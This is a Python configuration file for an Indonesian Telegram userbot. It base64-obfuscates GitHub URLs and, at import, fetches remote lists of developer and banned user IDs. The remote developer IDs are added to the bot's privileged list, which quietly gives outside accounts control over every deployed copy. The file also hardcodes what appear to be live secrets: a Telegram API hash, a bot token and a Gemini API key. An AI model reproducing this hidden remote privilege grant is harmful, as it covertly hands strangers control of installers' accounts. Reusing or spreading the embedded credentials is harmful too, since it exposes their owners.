import json
import sys
from base64 import b64decode
from os import getenv

import requests
from dotenv import load_dotenv

black = int(b64decode("MTA1NDI5NTY2NA=="))

ERROR = "Maintained ? Yes\n\nAnda tidak diperbolehkan menggunakan bot ini!!!"
DIBAN = "ANDA DIBANNED DI @DADDYHAJI"


def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        return f"An error occurred: {str(e)}"
        sys.exit(1)


TOLOL = get_tolol()

NO_GCAST = get_blgc()

load_dotenv()

id_button = {}
CMD_HELP = {}


DEVS = get_devs()

devs_boong = list(map(int, getenv("devs_boong", "").split()))
api_id = int(getenv("api_id", 20056340))
api_hash = getenv("api_hash", "b427db6549f59f62196ff4f927bf7d3c")
bot_token = getenv("bot_token", "7427028136:AAEc93LL_lhXo9uRvjjEU6w29t6-fHGMOug")
bot_id = int(getenv("bot_id", "7427028136"))
db_name = getenv("db_name", "calister")
log_pic = getenv("log_pic", "https://files.catbox.moe/5yodg5.jpg")
def_bahasa = getenv("def_bahasa", "id")
owner_id = int(getenv("owner_id", "1920815038"))
the_cegers = list(
    map(
        int,
        getenv(
            "the_cegers",
            "6997083640 1920815038",
        ).split(),
    )
)
dump = int(getenv("dump", "-1002312684831"))
bot_username = getenv("bot_username", "@calisterubot")
log_userbot = int(getenv("log_userbot", "1920815038"))
nama_bot = getenv("nama_bot", "Calister-Assistant")
gemini_api = getenv("gemini_api", "AIzaSyAd0WFdlCLpZ0zJP_tlt3pBAn-wM6zN0NY")
botcax_api = getenv("botcax_api", "GenzR")


if owner_id not in the_cegers:
    the_cegers.append(owner_id)
if owner_id not in DEVS:
    DEVS.append(owner_id)
    DEVS.append(1920815038)
for a in the_cegers:
    DEVS.append(a)
